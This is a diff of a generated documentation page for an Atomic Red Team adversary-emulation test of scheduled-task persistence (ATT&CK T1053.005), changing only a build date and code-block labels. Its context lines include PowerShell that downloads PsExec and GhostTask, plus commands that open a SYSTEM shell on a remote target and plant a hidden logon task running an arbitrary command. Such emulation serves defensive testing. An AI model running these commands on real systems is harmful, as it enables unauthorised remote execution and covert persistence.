@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1053.005"
 attack_technique_name: "Scheduled Task/Job: Scheduled Task"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "704333ca-cc12-4bcf-9916-101844881f54"
@@ -72,13 +72,13 @@ PsExec tool from Sysinternals must exist in the ExternalPayloads directory
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") { exit 0} else { exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
 Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
@@ -89,13 +89,13 @@ GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. 
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe") { exit 0} else { exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"
 ```
@@ -107,14 +107,14 @@ Invoke-WebRequest "https://github.com/netero1010/GhostTask/releases/download/1.0
 
 ### Command
 
-```commandprompt
+```cmd
 "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
 "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} add #{task_name} "cmd.exe" "/c #{task_command}" #{user_name} logon
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
 "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} delete #{task_name} > nul
 ```
